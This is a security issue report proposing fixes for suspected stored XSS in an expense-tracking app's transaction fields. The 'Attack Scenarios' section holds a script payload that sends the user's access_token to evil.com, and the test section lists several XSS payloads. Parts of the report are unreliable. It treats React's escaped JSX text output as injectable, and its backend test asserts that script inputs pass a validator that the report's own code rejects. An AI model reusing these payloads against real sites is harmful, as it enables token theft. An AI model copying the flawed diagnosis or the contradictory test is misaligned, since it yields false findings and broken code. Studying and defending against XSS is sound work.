# Security: XSS via Stored Transaction Data

## Priority

🟡 **MEDIUM** - Cross-Site Scripting (XSS) vulnerability

## Description

User-generated content (transaction names, notes, categories) is displayed without proper sanitization, creating potential for stored XSS attacks. While risk is low for single-user application, this violates secure coding practices and creates risk for future features.

## Security Risk

-   **Impact**: Medium - Account compromise possible
-   **Likelihood**: Low - Single user application limits attack surface
-   **CVSS**: Medium (4.5+)

## Vulnerable Display Points

### Transaction Names

**File**: `frontend/src/pages/Dashboard.jsx` (multiple locations)

```javascript
// Direct display without sanitization
<span className="font-medium text-gray-900 dark:text-dark-text">
    {expense.name} {/* Potential XSS */}
</span>
```

### Transaction Notes

**File**: Various transaction display components

```javascript
// Notes displayed directly
<p className="text-sm text-gray-500 dark:text-dark-text-secondary">
    {expense.notes} {/* Potential XSS */}
</p>
```

### Category and Subcategory

```javascript
// Category values displayed
<span className="text-sm text-gray-600 dark:text-dark-text-secondary">
    {expense.category} - {expense.subcategory} {/* Potential XSS */}
</span>
```

### Import/Export Functionality

CSV import parsing and display could introduce malicious content:

```javascript
// Imported data displayed without validation
{
    importedExpense.name;
} // Could contain malicious scripts
```

## Attack Scenarios

### Scenario 1: Malicious Transaction Entry

1. Attacker (or compromised session) creates expense with malicious name:
    ```
    Name: "<script>fetch('https://evil.com/steal?token=' + localStorage.getItem('access_token'))</script>"
    ```
2. Script executes when transaction list is viewed
3. Session tokens or sensitive data stolen

### Scenario 2: CSV Import Attack

1. Malicious CSV file imported with XSS payloads
2. Transaction data contains embedded scripts
3. Scripts execute when viewing imported transactions

### Scenario 3: Persistent XSS via Notes

1. Long-form notes field contains complex HTML/JS payload
2. Payload stored in database
3. Executes every time transaction details viewed

## Current Input Validation

### Backend Validation

**File**: `backend/utils/validators.py:53`

```python
def sanitize_string(value):
    """Remove potentially dangerous characters from string inputs."""
    if not value:
        return value
    # Strip leading/trailing whitespace
    value = value.strip()
    # Remove null bytes
    value = value.replace("\x00", "")
    return value
```

**Issue**: Only removes null bytes, doesn't handle HTML/JS

### Frontend Validation

Limited length validation but no XSS prevention:

```javascript
// Only length validation
if (name.length > 200) {
    setError("Transaction name too long");
}
```

## Secure Solutions

### Option 1: DOMPurify Sanitization (Recommended)

```bash
npm install dompurify
```

```javascript
// frontend/src/utils/sanitizer.js
import DOMPurify from "dompurify";

export const sanitizeHTML = (dirty) => {
    return DOMPurify.sanitize(dirty, {
        ALLOWED_TAGS: [], // No HTML tags allowed
        ALLOWED_ATTR: [],
        ALLOW_DATA_ATTR: false,
    });
};

export const sanitizeForDisplay = (text) => {
    if (!text) return text;

    // Strip all HTML and return plain text
    const cleanText = DOMPurify.sanitize(text, {
        ALLOWED_TAGS: [],
        ALLOWED_ATTR: [],
    });

    return cleanText;
};
```

### Option 2: HTML Entity Encoding

```javascript
// frontend/src/utils/htmlEncoder.js
export const escapeHtml = (text) => {
    if (!text) return text;

    const map = {
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        '"': "&quot;",
        "'": "&#039;",
        "/": "&#x2F;",
    };

    return text.replace(/[&<>"'\/]/g, (s) => map[s]);
};
```

### Option 3: React Safe Component

```javascript
// frontend/src/components/SafeText.jsx
import { sanitizeForDisplay } from "../utils/sanitizer";

const SafeText = ({ children, className = "" }) => {
    const safeText = sanitizeForDisplay(children);

    return <span className={className}>{safeText}</span>;
};

export default SafeText;
```

## Recommended Implementation

### Step 1: Install DOMPurify

```bash
cd frontend
npm install dompurify
npm install --save-dev @types/dompurify  # For TypeScript support
```

### Step 2: Create Sanitization Utils

```javascript
// frontend/src/utils/sanitizer.js
import DOMPurify from "dompurify";

// Configuration for different contexts
const CONFIG_STRICT = {
    ALLOWED_TAGS: [],
    ALLOWED_ATTR: [],
    ALLOW_DATA_ATTR: false,
    RETURN_DOM: false,
    RETURN_DOM_FRAGMENT: false,
    RETURN_DOM_IMPORT: false,
};

const CONFIG_BASIC_FORMATTING = {
    ALLOWED_TAGS: ["b", "i", "em", "strong"],
    ALLOWED_ATTR: [],
    ALLOW_DATA_ATTR: false,
};

export const sanitizeText = (dirty) => {
    if (!dirty) return dirty;
    return DOMPurify.sanitize(dirty, CONFIG_STRICT);
};

export const sanitizeWithBasicFormatting = (dirty) => {
    if (!dirty) return dirty;
    return DOMPurify.sanitize(dirty, CONFIG_BASIC_FORMATTING);
};

export const sanitizeForAttribute = (dirty) => {
    if (!dirty) return dirty;
    // Extra strict for attributes
    return DOMPurify.sanitize(dirty, {
        ...CONFIG_STRICT,
        FORBID_ATTR: ["onclick", "onload", "onerror", "onmouseover"],
    });
};
```

### Step 3: Update Display Components

```javascript
// frontend/src/pages/Dashboard.jsx
import { sanitizeText } from '../utils/sanitizer';

// Replace direct display
<span className="font-medium text-gray-900 dark:text-dark-text">
  {sanitizeText(expense.name)}
</span>

// For notes (might allow basic formatting)
<p className="text-sm text-gray-500 dark:text-dark-text-secondary">
  {sanitizeText(expense.notes)}
</p>
```

### Step 4: Backend Additional Validation

```python
# backend/utils/validators.py
import html
import re

def sanitize_string(value):
    """Enhanced string sanitization"""
    if not value:
        return value

    # Strip whitespace
    value = value.strip()

    # Remove null bytes and control characters
    value = re.sub(r'[\x00-\x1f\x7f-\x9f]', '', value)

    # HTML encode dangerous characters
    value = html.escape(value, quote=True)

    # Remove script-like patterns (defense in depth)
    script_patterns = [
        r'<script[^>]*>.*?</script>',
        r'javascript:',
        r'on\w+\s*=',
        r'expression\s*\(',
        r'@import',
    ]

    for pattern in script_patterns:
        value = re.sub(pattern, '', value, flags=re.IGNORECASE)

    return value

def validate_expense_name(name):
    """Enhanced expense name validation"""
    if not name:
        return False, "Expense name is required"

    # Sanitize first
    clean_name = sanitize_string(name)

    # Length check on clean content
    if len(clean_name) > 200:
        return False, "Expense name must be less than 200 characters"

    # Check for suspicious patterns
    suspicious_patterns = [
        r'<[^>]+>',  # HTML tags
        r'javascript:',  # JavaScript URLs
        r'data:',  # Data URLs
    ]

    for pattern in suspicious_patterns:
        if re.search(pattern, name, re.IGNORECASE):
            return False, "Expense name contains invalid characters"

    return True, clean_name
```

## Implementation Steps

### Phase 1: Frontend Sanitization

-   [ ] Install DOMPurify dependency
-   [ ] Create sanitization utility functions
-   [ ] Update all transaction display components
-   [ ] Test with malicious input samples

### Phase 2: Backend Hardening

-   [ ] Enhance server-side input validation
-   [ ] Add HTML encoding to validators
-   [ ] Update all input validation endpoints
-   [ ] Add sanitization tests

### Phase 3: Import/Export Security

-   [ ] Sanitize CSV import data
-   [ ] Validate file upload content
-   [ ] Secure export data handling
-   [ ] Add file type validation

### Phase 4: Security Testing

-   [ ] Penetration testing with XSS payloads
-   [ ] Automated security scanning
-   [ ] Code review for missed display points
-   [ ] Performance impact assessment

## Test Cases for XSS Prevention

### Frontend Test Payloads

```javascript
// Test cases for sanitization
const xssTestCases = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    'javascript:alert("XSS")',
    '<iframe src="javascript:alert(`XSS`)">',
    '"><script>alert("XSS")</script>',
    '<svg onload=alert("XSS")>',
    '<body onload=alert("XSS")>',
    '<div style="background:url(javascript:alert(1))">',
];

// All should be sanitized to safe text
```

### Backend Validation Tests

```python
# Test input validation
def test_xss_validation():
    test_cases = [
        '<script>alert("test")</script>',
        'Normal expense name',
        '<img src=x onerror=alert(1)>',
        'Coffee & pastries',  # Should preserve &
    ]

    for case in test_cases:
        valid, result = validate_expense_name(case)
        assert valid  # Should sanitize, not reject
        assert '<script>' not in result
        assert 'onerror=' not in result
```

## Files to Modify

-   `frontend/package.json` - Add DOMPurify dependency
-   `frontend/src/utils/sanitizer.js` - New sanitization utilities
-   `frontend/src/pages/Dashboard.jsx` - Update transaction displays
-   `frontend/src/components/ExpenseModal.jsx` - Sanitize form inputs
-   `backend/utils/validators.py` - Enhanced input validation
-   `backend/routes/expenses.py` - Apply sanitization
-   `backend/routes/income.py` - Apply sanitization

## Performance Considerations

-   DOMPurify adds ~0.1-0.5ms per sanitization
-   Consider caching sanitized content for repeated displays
-   Batch sanitization for large transaction lists

## Related Security Issues

-   Input validation enhancement (#XX)
-   CSV import security (#XX)
-   Content Security Policy strengthening (#XX)

## Labels

`security`, `medium`, `xss`, `frontend`, `backend`, `input-validation`
